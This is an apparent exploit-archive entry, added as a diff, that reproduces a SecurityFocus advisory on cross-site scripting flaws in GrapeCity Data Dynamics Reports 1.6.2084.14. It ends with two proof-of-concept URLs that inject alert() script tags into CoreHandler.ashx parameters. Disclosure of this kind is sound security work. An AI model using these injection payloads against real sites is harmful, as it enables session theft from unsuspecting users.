@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/47015/info
+
+GrapeCity Data Dynamics Reports is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Data Dynamics Reports 1.6.2084.14 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/CoreHandler.ashx?dd:script=CoreViewerInit.js&reportName=<script>alert(&#039;XSS1!&#039;)</script>&uniqueId=<script>alert(&#039;XSS2!&#039;)</script>#
+http://www.example.com/CoreHandler.ashx?dd:script=CoreController.js&uniqueId=<script>alert(&#039;XSS1!&#039;)</script>&traceLevel=<script>alert(&#039;XSS2!&#039;)</script>#
